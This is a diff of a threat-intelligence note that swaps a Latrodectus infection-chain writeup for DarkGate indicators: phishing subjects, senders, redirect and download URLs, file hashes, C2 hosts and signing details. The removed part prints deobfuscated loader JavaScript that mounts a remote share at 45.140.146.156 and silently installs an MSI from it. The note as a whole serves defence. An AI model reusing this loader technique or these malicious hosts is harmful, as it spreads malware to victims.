@@ -1,90 +1,100 @@
-THREAT IDENTIFICATION: LATRODECTUS
+THREAT IDENTIFICATION:  DARKGATE
 
-SUBJECTS OBSERVED
-Contact Submission
+INFECTION CHAIN
+.eml -> .pdf -> TDS url -> redirect url -> .cab -> .url -> msi -> .a3x (AutoIt Script) -> payload
 
-INFECTION FLOW
-.eml -> url -> .js -> .js (embedded) -> .msi -> .dll (likely embedded)
+OBSERVED SUBJECTS
+CASE#2451
+J218634679 Approval
+Nr: J8149253138
+RE: FWD: E-E's
+W951898152 Approval
 
-URL FROM THE EMAIL
-https://alan4president.com/b1750616502008583h13326991a44/casea22036311d7287/court/public/898372694484/dwnld/documents?n59985026=1631051366&c=ca&dmc=www.<redacted>.com&2918060e3&cmp=sidley&6961498r7
+OBSERVED SENDERS
+director@unitedkingdontube.com
+energy@wittybank.com
+marketing@welcomehygyxyi.com
+springenergy@welcomehygyxyi.com
+support@welcomemywowea.com
 
-FILTERED COMPUTERS REDIRECTED TO:
-https://harvardlawreview.org/wp-content/uploads/2016/06/2289-2296-Online.pdf?2918060e3&6961498r7&c=ca&cmp=sidley&dmc=www.<redacted>.com&n59985026=1631051366
+PDF FILE HASHES
+71b53c937101d20cbe883c1d14bbd9f1
+b4b936d38cf689bc13ffc7dbbe96c426
+df9c81279ef06878e63048a4eb31720e
+e169d301fd7d2ce82d875a51f859343d
 
-LANDING PAGE URL
-https://gulfinsidermedia.com/?2918060e3&6961498r7&c=ca&cmp=sidley&dmc=www.<redacted>.com&n59985026=1631051366
+PDF FILE NAMES
+February_-2023_3407794746.pdf
+feb-case_-2023_0995091891.pdf
+feb-case_-2024_4994032049.pdf
+info_-2023_0075679927.pdf
 
-JAVASCRIPT FILE DOWNLOAD URL
-https://firebasestorage.googleapis.com/v0/b/tst-4828.appspot.com/o/22OEf9N8Pv%2FLetter_k08_27h181190-57w49674g3400-9586e9.js?alt=media&token=225d98fc-c948-41e4-8803-f3988791b8f6
+INITIAL REDIRECT URLS
+https://monitor.clickcease.com//tracker/tracker?id=my2024mWEUFIqIrNt15&adpos=&nw=a&url=https://proniklsu63nenick.com?utm_content=LcZciOKudg&session_id=hTn63LPMxcK5cF7ehCPd&id=9mGUh&filter=CeRtSXkPOl-NrJRm&lang=zh&locale=GB
 
-JAVASCRIPT FILE HASH
-Letter_k08_27h181190-57w49674g3400-9586e9.js
-fdec2d3ab8e13d309a097622944a085e
+https://monitor.clickcease.com//tracker/tracker?id=mi2024qXUOFIqArNt30&adpos=&nw=a&url=https://proniklsu63nenick.com?utm_content=OjYyUEzwaR&session_id=QvWGtebYhr9elmU91dBn&id=l8xas&filter=UtEyEFspMZ-XCAui&lang=ru&locale=GB
 
-DEOBFUSCATED JAVASCRIPT FILE
-var fso = new ActiveXObject('Scripting.FileSystemObject')
-var scriptPath = WScript.ScriptFullName
-try {
-if (fso.FileExists(scriptPath)) {
-var file = fso.OpenTextFile(scriptPath, 1)
-var scriptCode = ''
-while (!file.AtEndOfStream) {
-var line = file.ReadLine()
-if (line.indexOf('////') === 0) {
-scriptCode += line.substring(4) + '\n'
-}
-}
-file.Close()
-if (scriptCode) {
-var func = new Function(scriptCode)
-func()
-}
-}
-} catch (e) {}
+https://monitor.clickcease.com//tracker/tracker?id=aj2024yYAAFIqArNt96&adpos=&nw=a&url=https://proniklsu63nenick.com?utm_content=ZbwOgniSIu&session_id=FSiLGWjl8hCOXKDhEJ0O&id=BMJPl&filter=hwYyrfcOPM-hwBdo&lang=zh&locale=DE
 
-DEOBFUSCATED SECOND EMBEDDED SCRIPT
-var network = new ActiveXObject("WScript.Network");
-for (var driveLetter = 90; driveLetter >= 65; driveLetter--) {
-    var letter = String.fromCharCode(driveLetter) + ":";
-    try {
-       network.MapNetworkDrive(letter, "\\\\45.140.146.156@80\\share\\");
-        var startTime = new Date();
-        while (new Date() - startTime < 6000) {}
-        GetObject("winmgmts:\\\\.\\root\\cimv2").Get("Win32_Process").Create('msiexec.exe -i \\\\45.140.146.156@80\\share\\observ.msi -qn', null, null, null);
-        network.RemoveNetworkDrive(letter);
-        break;
-    } catch (e) {
-    }
-}
+SECONDARY REDIRECT URLS
+https://proniklsu63nenick.com/?utm_content=LcZciOKudg
+https://proniklsu63nenick.com/?utm_content=OjYyUEzwaR
+https://proniklsu63nenick.com/?utm_content=ZbwOgniSIu
+https://proniklsu63nenick.com/?utm_content=UyoUlPywvZ
 
-TRAFFIC OBSERVED TO
-http://45.140.146.156/share
-http://45.140.146.156/share/Desktop.ini
-http://45.140.146.156/share/AutoRun.inf
-http://45.140.146.156/share/observ.msi
+CAB FILE DOWNLOAD URLS
+https://grpt.ca/js/cab/cases_2024-02-12_16-01-13-036815_99.cab
+https://grpt.ca/js/cab/cases_2024-02-12_16-01-12-847515_50.cab
+https://grpt.ca/js/cab/cases_2024-02-12_16-01-12-996419_89.cab
+https://grpt.ca/js/cab/cases_2024-02-12_16-01-12-884370_59.cab
+
+CAB FILE HASHES
+58888d54d24b730ab10fcd26cc871d19
+71e9ca611b1215c5eb3f2a2887021fda
+90cb2bce91cc50e9f1244c94bd714be7
+db8c6a7db9c535ffd07a12092a431e13
+(The files were named: "cases_2024-02-12_16-01-[0-9]{2}-[0-9]{6}_[0-9]{2}\.cab" )
+
+CAB FILE NAMES OBSERVED
+cases_2024-02-12_16-01-13-036815_99.cab
+cases_2024-02-12_16-01-12-847515_50.cab
+cases_2024-02-12_16-01-12-884370_59.cab
+cases_2024-02-12_16-01-12-996419_89.cab
+
+URL FILE HASHES
+a3a4438b1ecf4620d6eb2195efabfd45
+(File names were the same as the .cab files above but with .url extensions)
+
+URL FILE PROPERTIES
+file://95.164.63.54@80/documents/build-x64.zip/build-x64.msi
+
+MSI FILE DOWNLOAD URL
+95.164.63.54:80/documents/build-x64.zip/build-x64.msi
 
 MSI FILE HASH
-observ.msi
-876c5d995847eb3acfbe3a546648a7fb
+build-x64.msi
+2999391319cda1be5dacfaf5b05062b2
 
-SCRIPT ERROR (LIKELY A DECOY)
-There was a problem starting 
-C:\Users\analyst\AppData\Local\Putty/setordinal.dll
+AUTOIT SCRIPT FILE HASH
+script.a3x
+6354b28ac4bc8fa465d80c3ea3893116
 
-URL REFERENCED IN FILE
-https://github.com/mar10/wsgidav/
-"A generic and extendable WebDAV server written in Python and based on WSGI"
+ADDITIONAL FILE HASHES
+efkedaa
+3de6724322115d284769907259d72a82
 
-DLL FILE HASH
-setordinal.dll
-50a91559fab7869d51c0a7727c47a783
+test.txt
+45306f5622da212035662680f1c09e0e
 
-DLL LAUNCH COMMAND
-rundll32 setordinal.dll,bhuf
+UNPACKED PAYLOAD FILE HASH
+4d00000.exe
+8bb9319da6950b4709ec094f9babaa37
 
-C2 TRAFFIC
-https://plwskoret.top/live/
-https://miistoria.com/live/
+DARKGATE C2s
+http://prodomainnameeforappru.com:443/
 
+MSI FILE CERTIFICATE INFORMATION
+Name: Inoellact EloubantTech Optimization Information Co., Ltd.
+Emai: Not available
+Signing Time: Tuesday, February 13, 2024 4:39:34 AM
 
